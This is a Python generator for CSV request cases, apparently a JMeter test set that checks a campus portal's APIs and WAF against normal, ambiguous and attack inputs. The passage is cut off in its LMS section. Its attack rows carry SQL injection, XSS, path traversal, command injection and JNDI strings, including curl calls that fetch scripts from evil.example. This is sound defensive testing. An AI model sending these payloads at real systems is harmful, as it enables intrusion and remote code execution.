from __future__ import annotations

import csv
import json
from pathlib import Path
from textwrap import dedent
from urllib.parse import quote, urlencode
from xml.sax.saxutils import escape as xml_escape


OUT_DIR = Path(__file__).resolve().parent

CSV_COLUMNS = [
    "case_id",
    "case_class",
    "request_intent",
    "http_method",
    "request_path",
    "content_type",
    "request_body",
    "auth_scope",
    "capture_var",
    "capture_expr",
    "accepted_codes",
]

RUN_ID_EXPR = "${__property(mixed500_run_id)}"
BOARD_POST_VARS = ["board_post_a", "board_post_b", "board_post_c", "board_post_d", "board_post_e"]
BOARD_COMMENT_VARS = ["board_comment_a", "board_comment_b", "board_comment_c", "board_comment_d", "board_comment_e"]


def path(base: str, **params: object) -> str:
    clean = {key: value for key, value in params.items() if value is not None}
    if not clean:
        return base
    return base + "?" + urlencode(clean, quote_via=quote, safe="")


def body_json(payload: dict[str, object]) -> str:
    return json.dumps(payload, ensure_ascii=False, separators=(",", ":"))


def row(
    case_id: str,
    case_class: str,
    request_intent: str,
    http_method: str,
    request_path: str,
    *,
    content_type: str = "",
    request_body: str = "",
    auth_scope: str = "none",
    capture_var: str = "",
    capture_expr: str = "",
    accepted_codes: str = "",
) -> dict[str, str]:
    return {
        "case_id": case_id,
        "case_class": case_class,
        "request_intent": request_intent,
        "http_method": http_method,
        "request_path": request_path,
        "content_type": content_type,
        "request_body": request_body,
        "auth_scope": auth_scope,
        "capture_var": capture_var,
        "capture_expr": capture_expr,
        "accepted_codes": accepted_codes,
    }


def make_support_body(index: int, subject: str, message: str) -> str:
    return body_json(
        {
            "category": "PORTAL",
            "subject": f"{subject} {RUN_ID_EXPR}-{index:02d}",
            "message": message,
            "contactEmail": f"portal-{RUN_ID_EXPR}-{index:02d}@example.com",
            "referenceUrl": "http://www.kj.ac.kr/support-center",
        }
    )


def make_register_body(prefix: str, index: int, name: str, role: str = "STUDENT") -> str:
    return body_json(
        {
            "email": f"{prefix}-{RUN_ID_EXPR}-{index:02d}@campus.local",
            "password": "Password123!",
            "name": name,
            "role": role,
        }
    )


def make_login_body(email: str, password: str) -> str:
    return body_json({"email": email, "password": password})


def make_board_post_body(title: str, content: str) -> str:
    return body_json({"title": title, "content": content})


def make_comment_body(content: str) -> str:
    return body_json({"content": content})


def make_submit_body(content_text: str) -> str:
    return body_json({"contentText": content_text})


def make_grade_body(score: int, feedback: str) -> str:
    return body_json({"score": score, "feedback": feedback})


def make_enrollment_body(course_id: int, student_var: str) -> str:
    return body_json({"courseId": course_id, "studentId": student_var})


def write_csv(filename: str, rows: list[dict[str, str]]) -> None:
    path_obj = OUT_DIR / filename
    with path_obj.open("w", encoding="utf-8", newline="") as handle:
        writer = csv.DictWriter(handle, fieldnames=CSV_COLUMNS)
        writer.writeheader()
        writer.writerows(rows)


def public_rows() -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []

    normal_queries = [
        path("/api/health"),
        path("/api/public/academic-events"),
        path("/api/public/announcements", sort="latest", page=0, size=10),
        path("/api/public/announcements", sort="title", page=0, size=10),
        path("/api/public/announcements", sort="oldest", page=0, size=10),
        path("/api/public/announcements", keyword="도서관", sort="latest", page=0, size=10),
        path("/api/public/announcements", keyword="보안과목 과제", sort="title", page=0, size=10),
        path("/api/public/announcements", keyword="웹보안 실습", sort="latest", page=0, size=10),
        path("/api/public/announcements", keyword="캠퍼스 네트워크", sort="latest", page=0, size=10),
        path("/api/public/announcements", keyword="개강 안내", sort="latest", page=0, size=10),
        path("/api/public/announcements", keyword="수강정정", sort="title", page=0, size=10),
        path("/api/public/announcements", dateFrom="2026-03-01", dateTo="2026-03-31", sort="latest", page=0, size=10),
        path("/api/public/announcements", keyword="점검", dateFrom="2026-01-01", dateTo="2026-12-31", sort="title", page=0, size=10),
        "/api/public/announcements/1",
        "/api/public/announcements/2",
        "/api/public/announcements/999999",
        path("/api/public/announcements", keyword="도서관 운영시간", sort="latest", page=1, size=5),
        path("/api/public/announcements", keyword="장학금", sort="title", page=0, size=5),
        path("/api/public/announcements", keyword="네트워크 점검", sort="latest", page=0, size=5),
        path("/api/public/announcements", keyword="지원센터", sort="latest", page=0, size=5),
        path("/api/public/academic-events"),
        path("/api/health"),
        path("/api/public/announcements", keyword="개강", sort="latest", page=0, size=5),
        path("/api/public/announcements", keyword="도서관", dateFrom="2026-02-01", dateTo="2026-04-30", sort="latest", page=0, size=5),
        path("/api/public/announcements", keyword="네트워크", dateFrom="2026-02-01", dateTo="2026-04-30", sort="title", page=0, size=5),
        path("/api/public/announcements", keyword="중간고사", sort="latest", page=0, size=5),
        path("/api/public/announcements", keyword="캠퍼스", sort="title", page=0, size=5),
        path("/api/public/announcements", keyword="개강", sort="oldest", page=0, size=5),
        path("/api/public/announcements", keyword="운영시간", sort="latest", page=0, size=5),
        path("/api/public/announcements", keyword="공지", sort="latest", page=0, size=10),
    ]
    for index, request_path in enumerate(normal_queries, start=1):
        rows.append(row(f"public_{index:03d}", "normal", "public-normal", "GET", request_path, accepted_codes="200|404"))

    for index in range(31, 41):
        rows.append(
            row(
                f"public_{index:03d}",
                "normal",
                "support-normal",
                "POST",
                "/api/public/support-requests",
                content_type="application/json",
                request_body=make_support_body(index, "일반 문의", "포털 이용 중 일반적인 기능 확인과 UX 점검을 위해 남기는 정상 문의입니다."),
                accepted_codes="201|400",
            )
        )

    ambiguous_terms = [
        "select 문 정리",
        "script 태그 특강",
        "query string 안내",
        "SQL injection 교육",
        "XSS payload 메모",
        "alert tcp 로그",
        "cmd.exe 문자열 예시",
        "powershell -enc 설명",
        "LFI 경로 해설",
        "../admin 문맥 설명",
        "sleep 함수 안내",
        "shellshock note",
        "base64 인코딩 우회",
        "jndi 설명 자료",
        "drop table 금지 정책",
    ]
    for offset, term in enumerate(ambiguous_terms, start=41):
        rows.append(
            row(
                f"public_{offset:03d}",
                "ambiguous",
                "announcement-ambiguous-query",
                "GET",
                path("/api/public/announcements", keyword=term, sort="latest" if offset % 2 else "title", page=0, size=5),
                accepted_codes="200|400",
            )
        )

    for index in range(56, 66):
        rows.append(
            row(
                f"public_{index:03d}",
                "ambiguous",
                "support-ambiguous-body",
                "POST",
                "/api/public/support-requests",
                content_type="application/json",
                request_body=make_support_body(index, "보안 교육 문의", "select 문, script 태그, ../admin 예시처럼 과탐 가능성이 있는 문자열을 공지/문의 본문에 안전하게 쓰는 방법을 확인하고 싶습니다."),
                accepted_codes="201|400",
            )
        )

    typo_paths = [
        "/api/public/annuncements",
        "/api/public/announcement",
        "/api/public/announcements/",
        "/api/public/announcements//",
        "/api//public/announcements",
        "/api/public//announcements",
        "/API/public/announcements",
        "/api/public/Academic-events",
        "/api/public/acaedmic-events",
        "/api/public/academic-events/",
    ]
    for offset, request_path in enumerate(typo_paths, start=66):
        rows.append(row(f"public_{offset:03d}", "ambiguous", "public-url-typo", "GET", request_path, accepted_codes="200|400|404"))

    attack_terms = [
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "../admin",
        ";whoami",
        "${jndi:ldap://evil.example/a}",
        "cmd.exe /c whoami",
        "powershell -enc ZQB2AGkAbAA=",
        "|cat /etc/passwd",
        "waitfor delay '0:0:5'--",
        "union select password from users--",
    ]
    for offset, term in enumerate(attack_terms, start=76):
        rows.append(
            row(
                f"public_{offset:03d}",
                "attack",
                "announcement-attack-query",
                "GET",
                path("/api/public/announcements", keyword=term, sort="latest", page=0, size=5),
                accepted_codes="200|400",
            )
        )

    for index in range(86, 91):
        rows.append(
            row(
                f"public_{index:03d}",
                "attack",
                "support-attack-body",
                "POST",
                "/api/public/support-requests",
                content_type="application/json",
                request_body=make_support_body(index, "공격성 문자열 테스트", "<script>alert(1)</script>, ;whoami, ../etc/passwd 같은 문자열을 포함한 명확한 공격성 본문 전송 테스트입니다."),
                accepted_codes="201|400",
            )
        )

    tail_queries = [
        path("/api/public/announcements", keyword="보안 문자열 안내", sort="latest", page=0, size=10),
        path("/api/public/announcements", keyword="교육용 예시", sort="title", page=0, size=10),
        path("/api/public/announcements", keyword="문자열", sort="latest", page=0, size=10),
        "/api/public/announcements/1",
        "/api/public/academic-events",
        "/api/health",
        path("/api/public/announcements", keyword="오탐", sort="latest", page=0, size=10),
        path("/api/public/announcements", keyword="WAF", sort="title", page=0, size=10),
        path("/api/public/announcements", keyword="실습", sort="latest", page=0, size=10),
        path("/api/public/announcements", keyword="정상 요청", sort="latest", page=0, size=10),
    ]
    tail_classes = ["normal", "normal", "normal", "normal", "normal", "normal", "ambiguous", "ambiguous", "normal", "normal"]
    tail_intents = ["public-normal-tail"] * 6 + ["public-ambiguous-tail", "public-ambiguous-tail", "public-normal-tail", "public-normal-tail"]
    for offset, request_path in enumerate(tail_queries, start=91):
        rows.append(row(f"public_{offset:03d}", tail_classes[offset - 91], tail_intents[offset - 91], "GET", request_path, accepted_codes="200|404"))

    assert len(rows) == 100
    return rows


def auth_rows() -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []
    dynamic_email_01 = f"jmx-auth-{RUN_ID_EXPR}-01@campus.local"

    rows.extend(
        [
            row("auth_001", "normal", "auth-register-session", "POST", "/api/auth/register", content_type="application/json", request_body=body_json({"email": dynamic_email_01, "password": "Password123!", "name": "auth-session-user", "role": "STUDENT"}), accepted_codes="201|409"),
            row("auth_002", "normal", "auth-login-session", "POST", "/api/auth/login", content_type="application/json", request_body=make_login_body(dynamic_email_01, "Password123!"), capture_var="auth_dynamic_access_token", capture_expr="accessToken", accepted_codes="200|401"),
            row("auth_003", "normal", "auth-me-session", "GET", "/api/auth/me", auth_scope="auth_dynamic", accepted_codes="200|401"),
            row("auth_004", "normal", "auth-refresh-session", "POST", "/api/auth/refresh", content_type="application/json", request_body="", accepted_codes="200|401"),
            row("auth_005", "normal", "auth-logout-session", "POST", "/api/auth/logout", content_type="application/json", request_body="", accepted_codes="204"),
            row("auth_006", "normal", "auth-login-student1", "POST", "/api/auth/login", content_type="application/json", request_body=make_login_body("student1@campus.local", "Password123!"), capture_var="auth_dynamic_access_token", capture_expr="accessToken", accepted_codes="200|401"),
            row("auth_007", "normal", "auth-me-student1", "GET", "/api/auth/me", auth_scope="auth_dynamic", accepted_codes="200|401"),
            row("auth_008", "normal", "auth-refresh-student1", "POST", "/api/auth/refresh", content_type="application/json", request_body="", accepted_codes="200|401"),
            row("auth_009", "normal", "auth-logout-student1", "POST", "/api/auth/logout", content_type="application/json", request_body="", accepted_codes="204"),
            row("auth_010", "normal", "auth-login-admin1", "POST", "/api/auth/login", content_type="application/json", request_body=make_login_body("admin1@campus.local", "Password123!"), accepted_codes="200|401"),
        ]
    )

    for index in range(11, 31):
        rows.append(row(f"auth_{index:03d}", "normal", "auth-register-normal", "POST", "/api/auth/register", content_type="application/json", request_body=make_register_body("jmx-auth-normal", index, f"정상회원-{index:02d}"), accepted_codes="201|409"))

    login_accounts = ["student1@campus.local", "student2@campus.local", "student11@campus.local", "student12@campus.local", "student13@campus.local", "prof1@campus.local", "admin1@campus.local", "student14@campus.local", "student15@campus.local", "student1@campus.local", "student11@campus.local", "student12@campus.local", "prof1@campus.local", "admin1@campus.local", "student2@campus.local", "student13@campus.local", "student14@campus.local", "student15@campus.local", "student1@campus.local", "student11@campus.local"]
    for index, email in enumerate(login_accounts, start=31):
        rows.append(row(f"auth_{index:03d}", "normal", "auth-login-normal", "POST", "/api/auth/login", content_type="application/json", request_body=make_login_body(email, "Password123!"), accepted_codes="200|401"))

    ambiguous_names = ["select 문 예시 회원", "script 태그 강의 회원", "query string 연구 회원", "보안 보고서 회원", "alert tcp 분석 회원", "cmd.exe 교육 회원", "powershell 설명 회원", "drop table 금지 회원", "sleep 함수 회원", "base64 우회 회원"]
    for index, name in enumerate(ambiguous_names, start=51):
        rows.append(row(f"auth_{index:03d}", "ambiguous", "auth-register-ambiguous", "POST", "/api/auth/register", content_type="application/json", request_body=make_register_body("jmx-auth-ambiguous", index, name), accepted_codes="201|400|409"))

    ambiguous_passwords = ["SelectGuide123!", "ScriptTag123!", "QueryString123!", "AlertTcp123!", "CmdExample123!", "PowerShell123!", "DropTable123!", "SleepGuide123!", "Base64Note123!", "Traversal123!"]
    ambiguous_emails = ["student1@campus.local", "student2@campus.local", "student11@campus.local", "student12@campus.local", "student13@campus.local", "prof1@campus.local", "admin1@campus.local", "student14@campus.local", "student15@campus.local", "student1@campus.local"]
    for offset, password in enumerate(ambiguous_passwords, start=61):
        rows.append(row(f"auth_{offset:03d}", "ambiguous", "auth-login-ambiguous", "POST", "/api/auth/login", content_type="application/json", request_body=make_login_body(ambiguous_emails[offset - 61], password), accepted_codes="200|400|401"))

    duplicate_targets = [("student1@campus.local", "student1"), ("student2@campus.local", "student2"), ("student11@campus.local", "김민지"), ("student12@campus.local", "강해린"), ("student13@campus.local", "장원영")]
    for offset, (email, name) in enumerate(duplicate_targets, start=71):
        rows.append(row(f"auth_{offset:03d}", "ambiguous", "auth-register-duplicate", "POST", "/api/auth/register", content_type="application/json", request_body=body_json({"email": email, "password": "Password123!", "name": name, "role": "STUDENT"}), accepted_codes="201|409"))

    attack_passwords = ["' OR '1'='1", "<script>alert(1)</script>", ";whoami", "../etc/passwd", "${jndi:ldap://evil.example/a}", "cmd.exe /c whoami", "powershell -enc ZQB2AGkAbAA=", "waitfor delay '0:0:5'--", "union select password from users--", "`id`", "$(curl evil.example/poc.sh)", "benchmark(1000000,md5(1))", "../admin", "<img src=x onerror=alert(1)>", "admin'--"]
    for offset, password in enumerate(attack_passwords, start=76):
        rows.append(row(f"auth_{offset:03d}", "attack", "auth-login-attack", "POST", "/api/auth/login", content_type="application/json", request_body=make_login_body("student1@campus.local", password), accepted_codes="200|400|401"))

    attack_names = ["<script>alert(1)</script> 회원", "cmd.exe 예시 회원", "powershell -enc 회원", "../admin 경로 회원", ";whoami 회원", "${jndi:ldap://evil.example/a} 회원", "drop table 회원", "sleep(5) 회원", "alert tcp 룰 회원", "<img onerror> 회원"]
    for index, name in enumerate(attack_names, start=91):
        rows.append(row(f"auth_{index:03d}", "attack", "auth-register-attack", "POST", "/api/auth/register", content_type="application/json", request_body=make_register_body("jmx-auth-attack", index, name), accepted_codes="201|400|409"))

    assert len(rows) == 100
    return rows


def board_rows() -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []

    normal_queries = [
        path("/api/board/posts", keyword="wifi", sort="latest", page=0, size=5),
        path("/api/board/posts", keyword="도서관", sort="title", page=0, size=6),
        path("/api/board/posts", keyword="장학금", sort="latest", page=0, size=5),
        path("/api/board/posts", keyword="수강신청", sort="title", page=0, size=6),
        path("/api/board/posts", keyword="기숙사", sort="latest", page=0, size=5),
        path("/api/board/posts", keyword="cafeteria", sort="latest", page=0, size=5),
        path("/api/board/posts", keyword="parking", sort="title", page=0, size=6),
        path("/api/board/posts", author="student1", sort="latest", page=0, size=5),
        path("/api/board/posts", author="student2", sort="title", page=0, size=6),
        path("/api/board/posts", author="김민지", sort="latest", page=0, size=5),
        path("/api/board/posts", author="강해린", sort="title", page=0, size=6),
        path("/api/board/posts", author="장원영", sort="latest", page=0, size=5),
        path("/api/board/posts", keyword="wifi", dateFrom="2026-03-01", dateTo="2026-03-31", sort="latest", page=0, size=6),
        path("/api/board/posts", keyword="도서관", dateFrom="2026-02-01", dateTo="2026-03-15", sort="title", page=0, size=5),
        path("/api/board/posts", keyword="교양", sort="oldest", page=0, size=5),
        path("/api/board/posts", keyword="보안", sort="latest", page=0, size=5),
        "/api/board/posts/1",
        "/api/board/posts/2",
        "/api/board/posts/999999",
        path("/api/board/posts", keyword="정상 요청", sort="latest", page=1, size=5),
    ]
    for offset, request_path in enumerate(normal_queries, start=1):
        rows.append(row(f"board_{offset:03d}", "normal", "board-browse-normal", "GET", request_path, auth_scope="student", accepted_codes="200|404"))

    ambiguous_terms = [
        "select 문 정리",
        "script 태그 필터링",
        "alert tcp 룰",
        "SQL injection 보고서",
        "XSS payload 예시",
        "LFI 경로 예시",
        "base64 인코딩 우회",
        "cmd.exe 예시",
        "powershell -enc 예시",
        "../admin 경로 설명",
        "whoami 결과 설명",
        "nmap -sS 로그",
        "drop table 금지 정책",
        "javascript: 스킴 설명",
        "shellshock() note",
        "jndi 설명 자료",
        "sleep 함수 안내",
        "benchmark 함수 사례",
        "<img onerror> 필터링",
        "query string 정리",
    ]
    for offset, term in enumerate(ambiguous_terms, start=21):
        rows.append(
            row(
                f"board_{offset:03d}",
                "ambiguous",
                "board-search-ambiguous",
                "GET",
                path("/api/board/posts", keyword=term, sort="latest" if offset % 2 else "title", page=0, size=5 if offset % 3 else 6),
                auth_scope="student",
                accepted_codes="200|400",
            )
        )

    attack_terms = [
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "../../../../etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        ";whoami",
        "|cat /etc/passwd",
        "&& curl http://evil.example/a.sh",
        "${jndi:ldap://evil.example/a}",
        "benchmark(1000000,md5(1))",
        "waitfor delay '0:0:5'--",
        "sleep(5)",
        "$(curl evil.example/poc.sh)",
        "`id`",
        "cmd.exe /c whoami",
        "powershell -enc ZQB2AGkAbAA=",
        "../admin",
        "javascript:alert(1)",
        "union select password from users--",
        "%2527%2520or%25201=1--",
    ]
    for offset, term in enumerate(attack_terms, start=41):
        rows.append(row(f"board_{offset:03d}", "attack", "board-search-attack", "GET", path("/api/board/posts", keyword=term, sort="latest" if offset % 2 else "title", page=0, size=5), auth_scope="student", accepted_codes="200|400"))

    chain_specs = [
        {"case_class": "normal", "create_title": f"정상 게시글 {RUN_ID_EXPR} A", "create_content": "일반 게시글 작성 기능 점검용 본문입니다.", "update_title": f"정상 게시글 수정 {RUN_ID_EXPR} A", "update_content": "수정된 일반 게시글 본문입니다.", "comment_create": "정상 댓글 작성 테스트입니다.", "comment_update": "정상 댓글 수정 테스트입니다."},
        {"case_class": "ambiguous", "create_title": f"보안 교육 select 예시 {RUN_ID_EXPR} B", "create_content": "script 태그, ../admin, alert tcp 같은 문자열을 설명용으로 적는 게시글입니다.", "update_title": f"보안 교육 문자열 수정 {RUN_ID_EXPR} B", "update_content": "cmd.exe, powershell -enc, drop table 같은 문자열을 교육 문맥으로 정리합니다.", "comment_create": "query string, XSS payload, LFI 경로 예시를 댓글 문맥으로 남깁니다.", "comment_update": "보안 수업 과제 메모: select 문과 script 태그 예시는 설명용입니다."},
        {"case_class": "attack", "create_title": f"<script>alert(1)</script> 시도 {RUN_ID_EXPR} C", "create_content": "게시글 작성 경로에서 XSS 인젝션 시도를 발생시키는 본문입니다.", "update_title": f"<img src=x onerror=alert(1)> 수정 {RUN_ID_EXPR} C", "update_content": "수정 본문에도 명확한 스크립트 삽입 시도를 포함합니다.", "comment_create": "댓글 경로에도 <script>alert(1)</script> 시도를 넣습니다.", "comment_update": "댓글 수정 경로에서도 onerror 핸들러 시도를 넣습니다."},
        {"case_class": "attack", "create_title": f"cmd.exe /c whoami {RUN_ID_EXPR} D", "create_content": "게시글 본문에 ;whoami 와 ../etc/passwd 문자열을 포함한 명확한 공격 시도입니다.", "update_title": f"powershell -enc {RUN_ID_EXPR} D", "update_content": "수정 본문에 `id`, $(curl evil.example/poc.sh) 문자열을 포함합니다.", "comment_create": "댓글 본문에도 |cat /etc/passwd 문자열을 포함합니다.", "comment_update": "댓글 수정에 ${jndi:ldap://evil.example/a} 문자열을 포함합니다."},
        {"case_class": "attack", "create_title": f"admin'-- {RUN_ID_EXPR} E", "create_content": "로그인 우회형 SQLi 시도를 게시글 작성 본문으로 전달합니다.", "update_title": f"' OR '1'='1 {RUN_ID_EXPR} E", "update_content": "수정 본문에 waitfor delay, sleep(5) 예시를 함께 포함합니다.", "comment_create": "댓글에 ../admin 과 ;whoami 문자열을 함께 남깁니다.", "comment_update": "댓글 수정에 benchmark(1000000,md5(1)) 문자열을 포함합니다."},
    ]

    start = 61
    for spec_index, spec in enumerate(chain_specs):
        post_var = BOARD_POST_VARS[spec_index]
        comment_var = BOARD_COMMENT_VARS[spec_index]
        case_base = start + spec_index * 8
        rows.extend(
            [
                row(f"board_{case_base:03d}", spec["case_class"], "board-create-post", "POST", "/api/board/posts", content_type="application/json", request_body=make_board_post_body(spec["create_title"], spec["create_content"]), auth_scope="student", capture_var=post_var, capture_expr="id", accepted_codes="201|400|403"),
                row(f"board_{case_base + 1:03d}", spec["case_class"], "board-read-created-post", "GET", f"/api/board/posts/${{{post_var}}}", auth_scope="student", accepted_codes="200|404"),
                row(f"board_{case_base + 2:03d}", spec["case_class"], "board-update-post", "PUT", f"/api/board/posts/${{{post_var}}}", content_type="application/json", request_body=make_board_post_body(spec["update_title"], spec["update_content"]), auth_scope="student", accepted_codes="200|400|403|404"),
                row(f"board_{case_base + 3:03d}", spec["case_class"], "board-create-comment", "POST", f"/api/board/posts/${{{post_var}}}/comments", content_type="application/json", request_body=make_comment_body(spec["comment_create"]), auth_scope="student", capture_var=comment_var, capture_expr="id", accepted_codes="201|400|403|404"),
                row(f"board_{case_base + 4:03d}", spec["case_class"], "board-update-comment", "PUT", f"/api/board/posts/${{{post_var}}}/comments/${{{comment_var}}}", content_type="application/json", request_body=make_comment_body(spec["comment_update"]), auth_scope="student", accepted_codes="200|400|403|404"),
                row(f"board_{case_base + 5:03d}", spec["case_class"], "board-read-updated-post", "GET", f"/api/board/posts/${{{post_var}}}", auth_scope="student", accepted_codes="200|404"),
                row(f"board_{case_base + 6:03d}", spec["case_class"], "board-delete-comment", "DELETE", f"/api/board/posts/${{{post_var}}}/comments/${{{comment_var}}}", auth_scope="student", accepted_codes="204|403|404"),
                row(f"board_{case_base + 7:03d}", spec["case_class"], "board-delete-post", "DELETE", f"/api/board/posts/${{{post_var}}}", auth_scope="student", accepted_codes="204|403|404"),
            ]
        )

    assert len(rows) == 100
    return rows


def lms_rows() -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []

    def add(idx: int, case_class: str, intent: str, method: str, request_path: str, *, auth_scope: str, content_type: str = "", request_body: str = "", capture_var: str = "", capture_expr: str = "", accepted_codes: str) -> None:
        rows.append(row(f"lms_{idx:03d}", case_class, intent, method, request_path, content_type=content_type, request_body=request_body, auth_scope=auth_scope, capture_var=capture_var, capture_expr=capture_expr, accepted_codes=accepted_codes))

    normal_entries = [
        ("normal", "student-my-courses", "GET", "/api/lms/courses/my", "student", "200"),
        ("normal", "student-course1-assignments", "GET", "/api/lms/courses/1/assignments", "student", "200|403|404"),
        ("normal", "student-course2-assignments", "GET", "/api/lms/courses/2/assignments", "student", "200|403|404"),
        ("normal", "student-course5-assignments", "GET", "/api/lms/courses/5/assignments", "student", "200|403|404"),
        ("normal", "student-assignment1", "GET", "/api/lms/assignments/1", "student", "200|403|404"),
        ("normal", "student-assignment2", "GET", "/api/lms/assignments/2", "student", "200|403|404"),
        ("normal", "student-assignment3", "GET", "/api/lms/assignments/3", "student", "200|403|404"),
        ("normal", "student-alt-my-courses", "GET", "/api/lms/courses/my", "student_alt", "200"),
        ("normal", "student-alt-course1-assignments", "GET", "/api/lms/courses/1/assignments", "student_alt", "200|403|404"),
        ("normal", "student-alt-course6-assignments", "GET", "/api/lms/courses/6/assignments", "student_alt", "200|403|404"),
        ("normal", "student-alt-course7-assignments", "GET", "/api/lms/courses/7/assignments", "student_alt", "200|403|404"),
        ("normal", "student-alt-assignment1", "GET", "/api/lms/assignments/1", "student_alt", "200|403|404"),
        ("normal", "student-alt-assignment4", "GET", "/api/lms/assignments/4", "student_alt", "200|403|404"),
        ("normal", "student-alt-assignment5", "GET", "/api/lms/assignments/5", "student_alt", "200|403|404"),
        ("normal", "admin-users", "GET", "/api/lms/admin/users", "admin", "200|403"),
        ("normal", "admin-courses", "GET", "/api/lms/admin/courses", "admin", "200|403"),
        ("normal", "admin-enrollments", "GET", "/api/lms/admin/enrollments", "admin", "200|403"),
        ("normal", "admin-overviews", "GET", "/api/lms/admin/students/overviews", "admin", "200|403"),
        ("normal", "prof-assignment1", "GET", "/api/lms/assignments/1", "professor", "200|403|404"),
        ("normal", "prof-assignment4", "GET", "/api/lms/assignments/4", "professor", "200|403|404"),
        ("normal", "student-repeat-courses", "GET", "/api/lms/courses/my", "student", "200"),
        ("normal", "student-course3-assignments", "GET", "/api/lms/courses/3/assignments", "student", "200|403|404"),
        ("normal", "student-repeat-assignment1", "GET", "/api/lms/assignments/1", "student", "200|403|404"),
        ("normal", "student-alt-repeat-courses", "GET", "/api/lms/courses/my", "student_alt", "200"),
        ("normal", "student-alt-repeat-assignment5", "GET", "/api/lms/assignments/5", "student_alt", "200|403|404"),
        ("normal", "admin-repeat-users", "GET", "/api/lms/admin/users", "admin", "200|403"),
        ("normal", "admin-repeat-courses", "GET", "/api/lms/admin/courses", "admin", "200|403"),
        ("normal", "admin-repeat-enrollments", "GET", "/api/lms/admin/enrollments", "admin", "200|403"),
        ("normal", "admin-repeat-overviews", "GET", "/api/lms/admin/students/overviews", "admin", "200|403"),
        ("normal", "prof-assignment2", "GET", "/api/lms/assignments/2", "professor", "200|403|404"),
        ("normal", "prof-assignment3", "GET", "/api/lms/assignments/3", "professor", "200|403|404"),
        ("normal", "prof-assignment5", "GET", "/api/lms/assignments/5", "professor", "200|403|404"),
        ("normal", "lms-student-a-courses", "GET", "/api/lms/courses/my", "lms_student_a", "200"),
        ("normal", "lms-student-a-course1", "GET", "/api/lms/courses/1/assignments", "lms_student_a", "200|403|404"),
        ("normal", "lms-student-a-assignment1", "GET", "/api/lms/assignments/1", "lms_student_a", "200|403|404"),
    ]
    for idx, item in enumerate(normal_entries, start=1):
        case_class, intent, method, request_path, auth_scope, accepted_codes = item
        add(idx, case_class, intent, method, request_path, auth_scope=auth_scope, accepted_codes=accepted_codes)

    add(36, "normal", "admin-create-enrollment-course2", "POST", "/api/lms/admin/enrollments", auth_scope="admin", content_type="application/json", request_body=make_enrollment_body(2, "${lms_student_d_id}"), capture_var="lms_dyn_enroll_1", capture_expr="id", accepted_codes="201|400|403|404")
    add(37, "normal", "admin-list-enrollments-after-create", "GET", "/api/lms/admin/enrollments", auth_scope="admin", accepted_codes="200|403")
    add(38, "normal", "admin-delete-enrollment-course2", "DELETE", "/api/lms/admin/enrollments/${lms_dyn_enroll_1}", auth_scope="admin", accepted_codes="204|403|404")
    add(39, "normal", "admin-create-enrollment-course7", "POST", "/api/lms/admin/enrollments", auth_scope="admin", content_type="application/json", request_body=make_enrollment_body(7, "${lms_student_d_id}"), capture_var="lms_dyn_enroll_2", capture_expr="id", accepted_codes="201|400|403|404")
    add(40, "normal", "admin-delete-enrollment-course7", "DELETE", "/api/lms/admin/enrollments/${lms_dyn_enroll_2}", auth_scope="admin", accepted_codes="204|403|404")

    add(41, "normal", "submit-assignment1", "POST", "/api/lms/assignments/1/submissions", auth_scope="lms_student_a", content_type="application/json", request_body=make_submit_body("정상 제출 본문 " + RUN_ID_EXPR + " A-1"), capture_var="lms_sub_1", capture_expr="id", accepted_codes="201|400|403|404")
    add(42, "normal", "grade-assignment1", "POST", "/api/lms/submissions/${lms_sub_1}/grade", auth_scope="professor", content_type="application/json", request_body=make_grade_body(95, "정상 채점 피드백입니다."), accepted_codes="200|400|403|404")
    add(43, "ambiguous", "submit-assignment2-ambiguous", "POST", "/api/lms/assignments/2/submissions", auth_scope="lms_student_a", content_type="application/json", request_body=make_submit_body("select 문, script 태그, ../admin 예시를 교육용으로 정리한 제출물입니다. " + RUN_ID_EXPR), capture_var="lms_sub_2", capture_expr="id", accepted_codes="201|400|403|404")
    add(44, "ambiguous", "grade-assignment2-ambiguous", "POST", "/api/lms/submissions/${lms_sub_2}/grade", auth_scope="professor", content_type="application/json", request_body=make_grade_body(88, "select 문과 script 태그 예시는 설명용 문맥으로 보입니다."), accepted_codes="200|400|403|404")
    add(45, "normal", "submit-assignment3", "POST", "/api/lms/assignments/3/submissions", auth_scope="lms_student_b", content_type="application/json", request_body=make_submit_body("네트워크 보안 로그 분석 과제 제출 " + RUN_ID_EXPR + " B-3"), capture_var="lms_sub_3", capture_expr="id", accepted_codes="201|400|403|404")
    add(46, "ambiguous", "grade-assignment3-ambiguous", "POST", "/api/lms/submissions/${lms_sub_3}/grade", auth_scope="professor", content_type="application/json", request_body=make_grade_body(90, "alert tcp, cmd.exe, powershell -enc 예시는 교육용 맥락으로 확인했습니다."), accepted_codes="200|400|403|404")
    add(47, "ambiguous", "submit-assignment4-ambiguous", "POST", "/api/lms/assignments/4/submissions", auth_scope="lms_student_c", content_type="application/json", request_body=make_submit_body("웹보안 사례 조사: XSS payload, LFI 경로, query string 설명 " + RUN_ID_EXPR + " C-4"), capture_var="lms_sub_4", capture_expr="id", accepted_codes="201|400|403|404")
    add(48, "normal", "grade-assignment4-normal", "POST", "/api/lms/submissions/${lms_sub_4}/grade", auth_scope="professor", content_type="application/json", request_body=make_grade_body(92, "정상 제출이며 분석 구조가 좋습니다."), accepted_codes="200|400|403|404")
    add(49, "attack", "submit-assignment5-attack", "POST", "/api/lms/assignments/5/submissions", auth_scope="lms_student_c", content_type="application/json", request_body=make_submit_body("<script>alert(1)</script> 와 ;whoami 를 포함한 명확한 공격성 제출 테스트 " + RUN_ID_EXPR + " C-5"), capture_var="lms_sub_5", capture_expr="id", accepted_codes="201|400|403|404")
    add(50, "attack", "grade-assignment5-attack", "POST", "/api/lms/submissions/${lms_sub_5}/grade", auth_scope="professor", content_type="application/json", request_body=make_grade_body(70, "채점 피드백에 ${jndi:ldap://evil.example/a} 와 ../admin 문자열이 포함된 명확한 공격성 테스트입니다."), accepted_codes="200|400|403|404")

    negative_entries = [
        ("attack", "student-to-admin-users", "GET", "/api/lms/admin/users", "student", "403"),
        ("attack", "professor-to-admin-courses", "GET", "/api/lms/admin/courses", "professor", "403"),
